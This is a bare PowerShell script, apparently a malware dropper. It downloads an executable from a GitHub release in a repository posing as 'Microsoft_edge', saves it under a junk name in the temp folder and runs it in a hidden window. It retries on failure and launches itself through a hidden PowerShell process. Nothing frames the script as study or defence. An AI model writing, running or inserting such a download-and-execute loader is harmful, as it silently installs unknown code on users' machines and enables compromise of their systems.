$uri = "https://github.com/Dark-Shad0w404/Microsoft_edge/releases/download/V1/a.exe"
$outputFile = "$env:TEMP\aaaaaaaaa.exe"
$maxRetries = 10
$retryDelay = 2 


function Download-AndOpen {
    param ($uri, $outputFile, $maxRetries, $retryDelay)

    for ($i = 1; $i -le $maxRetries; $i++) {
        try {
            Invoke-WebRequest -Uri $uri -OutFile $outputFile -ErrorAction Stop
            Start-Process -FilePath $outputFile -WindowStyle Hidden
            break
        } catch {
            if ($i -lt $maxRetries) { Start-Sleep -Seconds $retryDelay }
        }
    }
}

Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"& { Download-AndOpen '$uri' '$outputFile' $maxRetries $retryDelay }`"" -WindowStyle Hidden
